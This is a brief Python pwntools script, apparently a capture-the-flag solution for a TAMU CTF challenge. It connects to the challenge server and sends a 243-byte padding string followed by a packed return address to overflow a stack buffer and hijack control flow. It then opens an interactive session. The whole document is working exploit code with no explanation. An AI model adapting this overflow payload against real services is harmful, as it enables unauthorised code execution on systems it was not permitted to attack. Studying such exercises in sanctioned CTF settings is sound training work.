from pwn import *

r = remote("pwn.ctf.tamu.edu", 4322)

print r.recvuntil("me!")

p = "A"*243
p += p32(0x804854b)
print p
#print q
r.sendline(p)

print r.recv(1024)
print r.recv(1024)

r.interactive()

